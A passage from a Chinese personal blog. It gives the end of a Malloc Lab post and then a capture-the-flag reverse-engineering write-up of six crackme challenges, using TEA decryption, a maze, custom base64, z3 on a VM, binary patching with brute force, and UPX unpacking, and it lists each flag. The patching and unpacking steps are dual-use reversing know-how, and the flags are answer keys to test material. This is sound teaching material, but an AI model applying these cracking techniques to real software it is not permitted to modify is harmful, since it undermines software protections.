<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mdriver -V</span><br></pre></td></tr></table></figure>

<p>如图：</p>
<p><img src="https://s2.loli.net/2022/09/12/YFhJiKkL3Bdqbfp.jpg" alt="check"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此，实现了所分析的内容：</p>
<p>模拟空间，填充——extend_heap；</p>
<p>已分配和未分配的块——有头尾的列表模式以及宏定义的操作；</p>
<p>开头结尾——mm_init；</p>
<p>以及有小标题的放置，分割，释放，合并小函数；</p>
<hr>
<p><img src="https://s2.loli.net/2022/09/12/oKRc8yNQZOGXk9Y.jpg" alt="forest"></p>
</div></div><a class="button-hover more" href="/SecondBC/2022/09/11/Malloc-Lab/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2022/08/18/%E5%81%87%E6%9C%9F%E5%A4%8D%E7%8E%B0/">假期复现</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2022-10-16</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/WriteUp/">WriteUp</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Reverse/">Reverse</a></div></div><div class="post-content"><div class="main-content content"><h2 id="1-havetea"><a href="#1-havetea" class="headerlink" title="1 . havetea"></a>1 . havetea</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/07/17/1376f9c70c6ecb62.png" alt="main"></p>
<p>左边是主函数里可以找到的，可以发现首先让输入key，且为16个长度，并且把输入的key分成两段进行了两次加密；在加密函数crypto里，是一个简单<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/TEA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/9383067?fr=aladdin">TEA运算</a>，只不过IDA抽风把 +=delta 翻译成了 -=补码；crypto又把输入的数据截成两段进行运算，使用的key可以在程序里找到；之后用加密数据进行比较；</p>
<p>知晓key和加密后的数据使用对应解密方式解密：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		r -= ((l&lt;&lt;<span class="number">4</span>) + c) ^ (l + sum) ^ ((l&gt;&gt;<span class="number">5</span>) + d);</span><br><span class="line">		l -= ((r&lt;&lt;<span class="number">4</span>) + a) ^ (r + sum) ^ ((r&gt;&gt;<span class="number">5</span>) + b);</span><br><span class="line">		sum -= delta;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>解密后得到输入为：<strong>please_drink_tea</strong></p>
<p><img src="https://i.bmp.ovh/imgs/2022/07/17/64d80edd5d6bb540.png" alt="end"></p>
<p>之后又让输入32长度的内容进行加密，并且用之前输入的16长度作为第二次加密cry的密钥；可以看出这次32长度的内容被分成了4段进行cry加密，而cry其实是和第一次的crypto差不多的TEA运算；加密完之后进行数据比较；</p>
<p>对应解密方式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		r -= (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ (l + ((<span class="number">16</span> * l) ^ (l &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">		sum -= delta;</span><br><span class="line">		l -= (sum + key[sum &amp; <span class="number">3</span>]) ^ (r + ((<span class="number">16</span> * r) ^ (r &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>解密后得到：<strong>flag{c616454f52a6334273b5f455a10ef818}</strong></p>
<h2 id="2-maze"><a href="#2-maze" class="headerlink" title="2.maze"></a>2.maze</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/07/134754dd288f1cbb.png" alt="main"></p>
<p>通过字符串搜索，找到主要函数，可以看到通过输入的v2来与v3进行 domaze 函数运算；右图为 domaze 函数，可以看出这是个三线迷宫，迷宫整体由v3控制，输入的v2代表玩家移动方向；</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/07/8e17607d241170f1.png" alt="maze"></p>
<p>通过调试可知，这是个指针制作的迷宫，前24位每8位代表一个方向，第25位开始往后是控制数；比如地址0x112E86A 为1，对应0x112E860处的方向的控制数，当这个控制数为 1 的时候，根据 domaze 函数的计算规则可知，会触发 sub_4C6470 结束函数；而最后一个 0 是代表是否走过这个路口，走过之后会变成 1；</p>
<p>之后通过这个规则去逆推回去：（这些是地址低三位）</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/07/9e28b505062294f5.png" alt="test"></p>
<p>正着写回去便是：<strong>rrrrtltltlllltlltrtrrr</strong>；</p>
<p>md5之后得到：<strong>flag{988b0f23719099efcbd66586a168bab9}</strong></p>
<h2 id="3-rota"><a href="#3-rota" class="headerlink" title="3.rota"></a>3.rota</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/07/56ae438b00a5db8a.png" alt="main"></p>
<p>最上面图展示了最终的比较数据；中间左边的图则是一开始的base64编码，下面的图展示了base64的变种码表；中间右边的图展示了最后是生成了一个BOX，用BOX与base64编码后的内容进行加密；</p>
<p>中间有BOX的生成内容，但是无关紧要，因为生成的数据和输入的内容无关，所以是固定的，BOX也就是固定的；</p>
<p>所以只需要破解这个加密就能够得出最终结果；</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/07/3a718c1a2cd93ce8.png" alt="crypto"></p>
<p>以上为crypt函数的内容；</p>
<p>调试加分析加软磨硬泡得出爆破代码的核心内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> v10 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>):</span><br><span class="line">        v11 = v5</span><br><span class="line">        v12 = (v5 + BOX[(v3 + v10) &amp; <span class="number">0x3F</span>]) &amp; <span class="number">0x3F</span></span><br><span class="line">        v13 = (v3 + <span class="number">1</span>) &amp; <span class="number">0x3F</span></span><br><span class="line">        v14 = BOX[((result + BOX[v12 + <span class="number">64</span>]) &amp; <span class="number">0x3F</span>) + <span class="number">128</span>]</span><br><span class="line">        <span class="keyword">if</span>(ans[j] == b64box[v14]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(b64box[v10]))</span><br><span class="line">            BOX[<span class="number">192</span>] = v13</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span>(v10 == <span class="number">65</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;erorr&#x27;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">not</span> v13):</span><br><span class="line">      v5 = (v5 + <span class="number">1</span>) &amp; <span class="number">0x3F</span></span><br><span class="line">      BOX[<span class="number">193</span>] = v5</span><br><span class="line">      <span class="keyword">if</span>(((v11 + <span class="number">1</span>) &amp; <span class="number">0x3F</span>) == <span class="number">0</span>):</span><br><span class="line">        result = (result + <span class="number">1</span>) &amp; <span class="number">0x3F</span></span><br><span class="line">        BOX[<span class="number">194</span>] = result</span><br></pre></td></tr></table></figure>

<p>然后和原代码一样，该循环几次循环几次，该有几个有几个；</p>
<p>得出base64编码后的内容为：cAJ7BzX+6zHrHwnTc/i7Bz6f6t6EBQDvc/xfHt9d6S9XX</p>
<p>再base64解码一遍：</p>
<p><img src="https://s2.loli.net/2022/08/07/Lm2koeIsCA3PzSx.png" alt="base64"></p>
<p>得到：<strong>flag{8cdd01062b7e90dd372c3ea9977be53e}</strong></p>
<h2 id="4-gocode"><a href="#4-gocode" class="headerlink" title="4.gocode"></a>4.gocode</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/08/be41905303bfdecf.png" alt="main"></p>
<p>gocode提示了这是go语言写的，所以搜索函数main_main找到主函数，通过右上角的图可知输入总长度为37，且是由 PCL{} 括起来的；</p>
<p>看到while（1）和switch 再根据题目名称，可知道这是个类似VM的东西，而根据docode变量可知第一站经过的便是右下角图中的函数，作用是把flag括起来的32个长度内容两两拼接成十六进制数，一共变成16个；</p>
<p>然后便是对不同指令码对应操作进行翻译：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/08/7d5ef9ba61931d33.png" alt="do"></p>
<p>逻辑就是每次经过AA开始判断，如果错误就退出程序，直到走完全部的code码就算成功；</p>
<p>把翻译的写成代码然后用z3来解：(重要代码)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">s = Solver()</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag[%d]&#x27;</span> % i,<span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>():</span></span><br><span class="line">    <span class="keyword">global</span> ip</span><br><span class="line">    <span class="keyword">global</span> code</span><br><span class="line">    <span class="keyword">global</span> ex</span><br><span class="line">    <span class="keyword">if</span> ip + <span class="number">2</span> &gt;= <span class="number">374</span> :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;ip out of range&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    s.add(ex[code[ip+<span class="number">1</span>]] == ex[code[ip+<span class="number">2</span>]])</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> ip &gt;= <span class="number">374</span>:</span><br><span class="line">        <span class="keyword">if</span> s.check() == sat:</span><br><span class="line">            <span class="built_in">print</span>(s.model())</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;no&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>解出数字后换成十六进制再拼写在一起便得到：<strong>PCL{bdcc4f46d73ec09ee628633d2f227b47}</strong></p>
<h2 id="5-analgo"><a href="#5-analgo" class="headerlink" title="5.analgo"></a>5.analgo</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/10/e9e40cfe728b32f2.png" alt="main"></p>
<p>第一眼看去会和上道题很像，也是类似虚拟机的构造，v23是指令，main_anal函数是虚拟机函数，下面的十六进制数是比较数据，判断输入的长度是42；</p>
<p>但是由于这个VM反编译出很多控制数不好分析各个指令码在做什么，同时发现输入是包含flag{}的，且每输入一个，比较结果也对应的变换一个，称之为一一对应；(蓝线是对应关系)</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/10/aa4c8dee1829543b.png" alt="company"></p>
<p>可以看到随着 flag{ 的输入，每输入一个，RCX 和 RDX 就相同一个字节；</p>
<p>那么可以使用之前hgame中 hardasm 题目的解法，将加密后的RCX值输出，与比较数据判断从而爆破；</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/10/802a1bcea8cfff64.png" alt="patch0"></p>
<p>先把判断搞掉，全nop，直接进入输出 wrong（SecondBC） 的地方；之后修改原程序比较的地方，改为将加密数据放到 SecondBC 这个地方：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/10/57ca9cd0558166a6.png" alt="patch1"></p>
<p>但因为 SecondBC 是 rdata段的，拥有只读权限，所以要修改权限：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/08/10/fb73adfe949db76d.png" alt="change"></p>
<p>搜索 .rdata，将 40 00 00 40 改为 40 00 00 C0； </p>
<p>之后写代码爆破：（使用subprocess模组）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">ans = <span class="string">&#x27;this is answer&#x27;</span>        <span class="string">&#x27;&#x27;&#x27;比较数据&#x27;&#x27;&#x27;</span></span><br><span class="line">hexs = <span class="string">&#x27;0123456789abcdef-&#x27;</span>		<span class="string">&#x27;&#x27;&#x27;约束范围，输入其他的程序会提前退出&#x27;&#x27;&#x27;</span></span><br><span class="line">hexs = <span class="built_in">list</span>(hexs)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line">    hexs[i] = <span class="built_in">ord</span>(hexs[i])</span><br><span class="line"></span><br><span class="line">real_flag=<span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line">cur_index = <span class="number">5</span>		<span class="string">&#x27;&#x27;&#x27;当前位置&#x27;&#x27;&#x27;</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> cur_index &lt; <span class="number">42</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> hexs:				</span><br><span class="line">        real_flag_arr = [<span class="number">0</span>] * <span class="number">42</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(real_flag)):					<span class="string">&#x27;&#x27;&#x27;爆破储存位置&#x27;&#x27;&#x27;</span></span><br><span class="line">            real_flag_arr[j] = <span class="built_in">ord</span>(real_flag[j])</span><br><span class="line">        real_flag_arr[<span class="built_in">len</span>(real_flag_arr)-<span class="number">1</span>] = <span class="built_in">ord</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(real_flag_arr)-<span class="number">2</span>,cur_index,-<span class="number">1</span>):</span><br><span class="line">            real_flag_arr[j] = <span class="number">48</span>				<span class="string">&#x27;&#x27;&#x27;未知位填充0&#x27;&#x27;&#x27;</span></span><br><span class="line">        </span><br><span class="line">        real_flag_arr[cur_index] = i</span><br><span class="line">        real_flag_arr_s = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> real_flag_arr)</span><br><span class="line">        p = subprocess.Popen([<span class="string">&quot;C:\\Users\\Second_BC\\Desktop\\analgo.exe&quot;</span>], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">        p.stdin.write(real_flag_arr_s.encode())		<span class="string">&#x27;&#x27;&#x27;输入程序&#x27;&#x27;&#x27;</span></span><br><span class="line">        p.stdin.close()</span><br><span class="line">        out = p.stdout.read()		<span class="string">&#x27;&#x27;&#x27;读取输出&#x27;&#x27;&#x27;</span></span><br><span class="line">        out = <span class="built_in">list</span>(out)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out[k] == ans[k] ):</span><br><span class="line">            real_flag += <span class="built_in">chr</span>(i)</span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">            cur_index += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(real_flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>由于这个程序是 8字节 8字节来比较的，所以手动多调几次，传入之前先 add rsi 8 获取之后的加密数据；</p>
<p>然后每轮都改下cur_index += 8；</p>
<p>然后得到：<strong>flag{568a3cdd-77e1-4c42-9fee-127e27a5744e}</strong></p>
<h2 id="6-puzzle"><a href="#6-puzzle" class="headerlink" title="6.puzzle"></a>6.puzzle</h2><p>一开始发现是个加壳程序，跑一遍发现和UPX加壳很像，一开始是循环解码，然后进入原入口；用PE也显示其为UPX加壳，但是提示不能用指令脱壳；</p>
<p>使用十六进制查看器发现原UPX标记处被改为了vmp，将其改回并用指令对其脱壳；</p>
<p><img src="https://s2.loli.net/2022/08/18/iNmo4yPxY3CDvdu.png" alt="unpack"></p>
<p>之后进去过后看IDA：</p>
<p><img src="https://s2.loli.net/2022/08/18/QlHr3EZWxiqSUIa.png" alt="main"></p>
<p>在scanf之后的是一段循环，通过调试可以知道，这里允许通过 0 ~ 9 字符，并且一共输入56个，否则失败；</p>
<p>这段循环将输入的56个数字放到一些地址里，而地址原来就有些数据；填完之后一共是 9*9 = 81个数据；</p>
<p>然后来到判断 judge 函数，这里它将这81个内容作为参数传入；</p>
<p>经过调试呢，可以发现，输入的内容中，有些是不能重复的，而且不能有 0 ；这可以让想起数独游戏；</p>
<p>把里面给的数据拿出来做成 9 * 9 的数独表，然后进行求解：</p>
<p><img src="https://s2.loli.net/2022/08/18/QNplakuqID2Zjdi.png" alt="solve"></p>
<p>解出输入的56个内容为：<strong>76135283549798674164925733849217386455934161872359295314</strong></p>
<p>输入源程序之后，便得到： <strong>flag{23c3cb3aedbbfdd009d1bf52e530676a}</strong></p>
</div></div><a class="button-hover more" href="/SecondBC/2022/08/18/%E5%81%87%E6%9C%9F%E5%A4%8D%E7%8E%B0/#more">阅读全文</a></div></div><div id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/SecondBC/page/2/">2</a><a class="page-number" href="/SecondBC/page/3/">3</a><a class="extend next" rel="next" href="/SecondBC/page/2/">&lt;i class&#x3D;&quot;fas fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></div></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fas fa-user"></i></span><span id="busuanzi_value_site_uv"></span><span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fas fa-eye"></i></span><span id="busuanzi_value_site_pv"></span><span></span></div><div class="copyright">&copy;2022 By Second_BC</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/SecondBC/js/copy.js"></script><!--script(src=url)--></body></html>